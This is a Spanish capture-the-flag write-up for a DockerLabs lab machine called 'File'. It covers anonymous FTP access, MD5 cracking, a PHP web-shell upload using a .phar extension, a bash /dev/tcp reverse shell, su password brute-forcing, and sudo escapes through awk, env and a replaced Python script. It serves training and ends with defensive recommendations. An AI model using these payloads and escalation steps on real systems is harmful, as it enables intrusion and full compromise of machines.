# Writeup Template: Maquina `[ File ]`

- Tags: #File 
- Dificultad: #Facil
- Plataforma: #DockerLabs

---
## Enlace al laboratorio
`[Enlace_Descarga_o_Acceso]`

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x file.zip
sudo bash auto_deploy.sh file.tar
```

---

## Fase de Reconocimiento
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 [IP_TARGET] 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py [IP_TARGET]
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t [IP_TARGET] -p [Rango_Puertos]

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn [IP_TARGET] -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p21,80 [IP_TARGET] -oN targeted
```

**Servicios identificados:**
1. `[ 21 ]/[ TCP ]`: [ FTP ] ([ 3.0.5 ])
2. `[ 80 ]/[ TCP ]`: [ Apache ] ([ 2.4.41 ]) **ubuntuFocal**
---
## Enumeracion de [ Servicio FTP ]
Lanzamos un script para detectar si el usuario **Anonymous** esta habilitado.
```bash
 nmap --script ftp-anon.nse -p 21 172.17.0.2
```

Resultado obtenido:

Nos podremos conectar como este usuario sin proporcionar contrasena.
```bash
ftp-anon: Anonymous FTP login allowed (FTP code 230)
-r--r--r--    1 65534    65534          33 Sep 12  2024 anon.txt # Tenemos capaciada de lectura sobre este archivo.
```

Nos conectamos por este servicio para poder leeer el contenido de ese archivo: **( anon.txt )**
```bash
# Descargamos el contenido
wget -r ftp://anonymous@172.17.0.2/
```

Revisamos el contenido de este achivo:
```bash
cat anon.txt

53dd9c6005f3cdfc5a69c5c07388016d # Tenemos una potencial contrasena de algun usuario.
```

Realizando un ataque de fuerza bruta sobre el archivo desucbrimos que puede ser un potencial usuario:
```bash
john --wordlist= /usr/share/wordlists/rockyou.txt passwords.txt --format=raw-md5
```

Resultado:
```bash
# Tenemos usuarios potencilaes.
justin
emerald
```

Realizando fuerza bruta no obtuvimos nada
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f ftp://172.17.0.2
```
## Enumeracion de [Servicio Web Principal]
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://[IP_TARGET] # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p [PORT] [IP_TARGET]
```

Tenemos un potencial directorio: El cual si no valida la subida de archivos nos permitiria subir un archivo mailicioso
```bash
/uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
- `[ /uploads ]`: Aqui es donde se almacenan los archivos que sean subidos..
- `[ index.html ]`: Pagina principal de la web

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,sh,txt,html,js,php.back
```

- **Hallazgos**:
Tenemos una via potencial de subir archivos maliciosos si no se validad el tipo de archivo.
```bash
/file_upload.php      (Status: 200) [Size: 468]
```

### Credenciales Encontradas
- Usuario: `[Usuario]`
- Contraseña: `[Contraseña]`

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora intentaremos subir un archivo **php** que nos permita ejeuctar una ejecutar un comando a nivel de sistema, 
Interceptaremos la peticion donde podemos cargar un archivo para intentar multiples extensiones de php.
### Ejecucion del Ataque
Crearemos un archivo: **( cmd.php )** el cual contrendra la siguiete estructura:
```php
<?php
  system($_GET["cmd"]);
?>
```

Una ves interceptada la peticion, Probraremos multiples extensiones php que contremplan como validas para estos archivos.

Logramos cargar un archivos con extension: **( phar )**
```bash
Content-Disposition: form-data; name="archivo"; filename="cmd.phar"
Content-Type: application/x-php

<?php
  system($_GET["cmd"]);
?>
```

Ganando acceso a la maquina:
```bash
http://172.17.0.2/uploads/ # Aqui se cargara nuestro archivo.
```

Explotacion:
```bash
# Comandos para explotación
172.17.0.2/uploads/cmd.phar?cmd=whoami
```
### Intrusion
```bash
# Reverse shell o acceso inicial
http://172.17.0.2/uploads/cmd.phar?cmd=bash -c 'exec bash -i %26>/dev/tcp/IP/PORT <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
sudo -l # No encontramos nada
find / -perm -4000 2>/dev/null # No encontramos nada
getcap -r / 2>/dev/null # No encontramos nada
contrab -l # No encontramos nada
```
Despues de realizar una enumeracion del sistema no encontramos nada critico, tendremos que aplicar fuerza bruta para los usuarios del sistema
Para ello usaremos una herrmienta que nos permite realizar fuerza bruta **( Linux-Su-Force.sh )**

Al final tendremos estas dos herramientas que trasnferiremos al la maquina:
```bash
cp /usr/share/wordlists/rockyou.txt . # nos creamos una copia de este diccionario
```

```bash
rockyou.txt Linux-Su-Force.sh
```

```python
# Montamos un servidor para poder transferirnos este herramienta a la maquina
python3 -m http.server 80
```

Desde la maquina objetivo con este comando: **( wget )** nos transferimos este archivos
```bash
wget http://192.168.100.24/rockyou.txt
wget http://192.168.100.24/Linux-Su-Force.sh
```

```bash
chmod +x Linux-Su-Force.sh
```

Ejecutamos las herramientas:
```bash
./Linux-Su-Force.sh mario rockyou.txt
```

**Hallazgos Clave:**
- Binario con privilegios: `[ Ninguno ]`
- Credenciales de usuario: `[ mario ]:[ password123 ]`
### Explotacion de Privilegios
```bash
# Comando para escalar al usuario: ( mario )
su mario ( password123 )
```

Ahora toca explotar los privilegios de este usaurio
```bash
# Comando para escalar al usuario: ( julen )
sudo -u julen /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /usr/bin/awk ]`
- Credenciales de usuario: `[ jelen ]:[  ]`

```bash
User julen may run the following commands on 2e00a59d8d5d:
    (iker) NOPASSWD: /usr/bin/env
```

Ahora toca explotar los privilegios de este usaurio
```bash
# Comando para escalar al usuario: ( iker )
sudo -u iker /usr/bin/env /bin/bash
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /usr/bin/env ]`
- Credenciales de usuario: `[ iker ]:[  ]`

```bash
User iker may run the following commands on 2e00a59d8d5d:
    (ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py
```

Ahora toca explotar los privilegios de este usaurio
```bash
# Comando para escalar al usuario: ( root )
sudo -u iker /usr/bin/env /bin/bash
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /usr/bin/geo_ip.py ]`
- Credenciales de usuario: `[ root ]:[  ]`

Modificamos el archivo cambiandolo de nombre para nosotros poder crear el nuestro propio bajo ese mismo nombre
```bash
mv geo_ip.py otro.py
```

Su contenido:
```python
import os
os.system("/bin/bash")
```

Explotamos el privilegio:
```bash
sudo /usr/bin/python3 /home/iker/geo_ip.py
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@2e00a59d8d5d:/home/iker# whoami
root
```

---

## Lecciones Aprendidas
1. Usuario **Anonymous** siempre permite loguearnos sin contrasena
2. Creacion de diccionarios personalizados basados en un usuario
3. Uso de herramientas como: **Linux-Su-Force.sh** y **rockyou.txt** para ataques de fuerza bruta

## Recomendaciones de Seguridad
- Deshabilitar el usuario **Anonymoues**
- Controlar archivos compartidos por **FTP**
- Validar cuando se pueda subir archivos al servidor que no sean maliciosos.

